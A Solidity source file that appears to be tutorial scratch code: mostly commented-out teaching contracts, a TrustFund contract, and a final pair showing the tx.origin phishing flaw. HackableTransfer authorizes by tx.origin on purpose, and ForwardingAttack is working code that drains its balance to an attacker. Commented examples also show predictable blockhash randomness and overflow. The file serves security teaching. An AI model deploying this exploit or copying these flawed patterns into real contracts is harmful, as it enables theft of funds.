pragma solidity ^0.4.15; // specifies minimum Solidity version to compiler

//contract Airbud {
//    // state variables forced to storage
//    address[] users;
//    mapping(address => uint) public balances;
//    
//    function yelp () public payable {
//        // local variable defaults to storage
//   	    address user = msg.sender;
//	  
//        // local variable declared to memory
//        uint8[3] memory ids = [1,2,3];
//    }
//}
//
//contract TimedPayout {
//    uint start;
//
//    function TimedPayout () {
//        start = now;
//    }
//
//    function claim () {
//        if (now > start + 10 days)
//            msg.sender.transfer(address(this).balance);
//    }
//}
//
//contract Arrays {
//    function test() {
//		uint[3] ids; // empty fixed size array 
//		uint[] x; // empty dynamic array
//		x.push(2);
//		x.length; // 1
//		x.length += 1; // adds a zero value element
//    }
//}
//
//contract Structs {
//    enum BetStatus { Open, Closed }
//
//	struct Bet {
//		uint amount; /* in wei */
//		int32 line;
//		BetStatus status; /* enum */
//	}
//
//	function test () {
//		Bet memory bet = Bet(1 ether, -1, BetStatus.Open);
//		bet.line; // -1
//	}
//}
//
//contract Bear {
//    // state variables
//    string public name = "gummy";
//    uint internal id = 1;
//
//    function touchMe (uint times) public constant returns (bool) {
//        bool touched = false; // local variable
//        if (times > 0) touched = true;	
//        return touched;
//    }		
//}
//contract owned {
//    function owned() { owner = msg.sender; }
//    address owner;
//}
//
//contract mortal is owned {
//    function kill() {
//        if (msg.sender == owner) selfdestruct(owner);
//    }
//}
//contract owned {
//    function owned() { owner = msg.sender; }
//    address owner;
//
//    modifier onlyOwner {
//        require(msg.sender == owner);
//        _;
//    }
//}
//
//contract mortal is owned {
//    function kill() onlyOwner {
//        selfdestruct(owner);
//    }
//}
//contract BugSquash {
//    enum State { Alive, Squashed }
//    State state;
//    address owner;
//
//    function BugSquash () {
//        state = State.Alive;
//        owner = msg.sender;
//    }
//
//    function squash () {
//        // this should never throw an error
//        assert(owner != address(0));
//
//        if (state == State.Alive)
//            state = State.Squashed;
//        else if (state == State.Squashed)
//            revert(); // user error, refund gas
//    }
//
//    function kill () {
//        // any non-owner trying to kill the contract
//        // likely has malicious intent
//        require(msg.sender == owner);
//        selfdestruct(owner);
//    }
//}
//contract Math {
//    function test() {
//        uint a = 2;
//        int b = 3;
//        a * b;
//   }
//
//contract Payout {
//
//    address receiver = address(15); // dummy address
//    function modifyAndPayout () {
//
//        uint balance = address(this).balance;
//        receiver.transfer(balance);
//    }
//}
contract TrustFund {
    address[3] public children;

    function TrustFund (address[3] _children) public {
        children = _children;
    }

    function updateAddress(uint child, address newAddress) public {
        require(msg.sender == children[child]);
        children[child] = newAddress;
    }

    function disperse () public {
        uint balance = address(this).balance;
        children[0].send(balance / 2);
        children[1].send(balance / 4);
        children[2].send(balance / 4);
    }

    function () payable public {}
}

contract SaltyChild {}

//contract Welfare {
//    address[] recipients;
//
//    function register () {
//        recipients.push(msg.sender);
//    }
//
//    function disperse () {
//        uint balance = address(this).balance;
//        uint amount = balance / recipients.length;
//        for (uint i=0; i < recipients.length; i++) {
//            recipients[i].send(amount);
//        }
//    }
//
//    function () payable {}
//}
//
//contract Roulette {
//    mapping(address => uint) public balances;
//
//    function betRed () payable {
//        bool winner = (randomNumber() % 2 == 0);
//        if (winner)
//            balances[msg.sender] += msg.value * 2;
//    }
//
//    function randomNumber() returns (uint) {
//        // we will implement this in a later section
//        // for now it returns 0 by default
//    }
//
//    function withdraw () {
//        uint amount = balances[msg.sender];
//        balances[msg.sender] = 0;
//        msg.sender.transfer(amount);
//    }
//}
//
//contract Roulette {
//    function betRed () payable {
//        bool winner = (randomNumber() % 2 == 0);
//        if (winner)
//            msg.sender.transfer(msg.value * 2);
//    }
//
//    function randomNumber() returns (uint) {
//        // we will implement this in a later section
//        // for now imagine it returns a number from
//        // 0-36
//    }
//}
//
//contract Welfare {
//    address[] recipients;
//    uint totalFunding;
//    mapping(address => uint) withdrawn;
//
//    function register () {
//        recipients.push(msg.sender);
//    }
//
//    function () payable {
//        totalFunding += msg.value; 
//    }
//
//    function withdraw () {
//        uint withdrawnSoFar = withdrawn[msg.sender];
//        uint allocation = totalFunding / recipients.length;
//        require(allocation > withdrawnSoFar);
//
//        uint amount = allocation - withdrawnSoFar;
//        withdrawn[msg.sender] = allocation;
//        msg.sender.transfer(amount);
//    }
//}
//contract Marriage {
//    address wife = address(0); // dummy address
//    address husband = address(1); // dummy address
//    mapping (address => uint) balances;
//
//    function withdraw () {
//        uint amount = balances[msg.sender];
//        balances[msg.sender] = 0;
//        msg.sender.transfer(amount);
//    }
//
//    function () payable {
//        balances[wife] += msg.value / 2;
//        balances[husband] += msg.value / 2;
//    }
//}
//
//contract ERC20 {
//  uint public totalSupply;
//
//  function balanceOf(address who) constant returns (uint);
//  function allowance(address owner, address spender) constant returns (uint);
//
//  function transfer(address to, uint value) returns (bool ok);
//  function transferFrom(address from, address to, uint value) returns (bool ok);
//  function approve(address spender, uint value) returns (bool ok);
//
//  event Transfer(address indexed from, address indexed to, uint value);
//  event Approval(address indexed owner, address indexed spender, uint value);
//}
//
//contract TokenSale {
//    enum State { Active, Suspended }
//
//    address public owner;
//    ERC20 public token;
//    State public state;
//
//    function TokenSale(address tokenContractAddress) {
//        owner = msg.sender;
//        token = ERC20(tokenContractAddress);
//        state = State.Active;
//    }
//
//    // 1:1 exchange of ETH for token
//    function buy() payable {
//        require(state == State.Active);
//        token.transfer(msg.sender, msg.value);
//    }
//
//    function suspend () {
//        require(msg.sender == owner);
//        state = State.Suspended;
//    }
//
//    function activate () {
//        require(msg.sender == owner);
//        state = State.Active;
//    }
//
//    function withdraw() {
//        require(msg.sender == owner);
//        owner.transfer(address(this).balance);
//    }
//}
//contract Random {
//    function example () public view returns (uint) {
//        uint seed = 0x7543def;
//        return range(seed, 100);
//    }
//
//    function range (uint seed, uint max) public view returns (uint) {
//        return random(seed) % max;
//    }
//
//    function random(uint seed) public view returns (uint) {
//        return uint(
//            keccak256(block.blockhash(block.number-1), seed)
//        );
//    }
//}
//contract C {
//    // (2**256 - 1) + 1 = 0
//    function overflow() returns (uint256 _overflow) {
//        uint256 max = 2**256 - 1;
//        return max + 1;
//    }
//
//    function mult () returns (int8) {
//        int8 b = 64;
//        b *= 3;
//        return b;
//    }
//
//    // 0 - 1 = 2**256 - 1
//    function underflow() returns (uint256 _underflow) {
//        uint256 min = 0;
//        return min - 1;
//    }
//}
//contract Stock {
//    function balanceOf (address owner) public view returns (uint) {
//        return 0; 
//    }
//    function transfer(address to, uint amount) public {}
//}
//contract MarriageInvestment {
//    address wife = address(0); // dummy address
//    address husband = address(1); // dummy address
//    Stock GOOG = Stock(address(2)); // dummy contract
//
//    function split () public {
//        uint amount = GOOG.balanceOf(address(this));
//        uint each = amount / 2;
//        uint remainder = amount % 2;
//        GOOG.transfer(husband, each + remainder);
//        GOOG.transfer(wife, each);
//    }
//}
contract HackableTransfer {
    address public owner;

    function HackableTransfer() public {
        owner = msg.sender;
    }

    function transferTo(address dest) public {
        require(tx.origin == owner);
        dest.transfer(address(this).balance);
    }

}
contract ForwardingAttack {
    HackableTransfer hackable;
    address attacker;

    function ForwardingAttack (address _hackable) public {
        hackable = HackableTransfer(_hackable);
        attacker = msg.sender;
    }

    function () payable public {
        hackable.transferTo(attacker);
    }
}
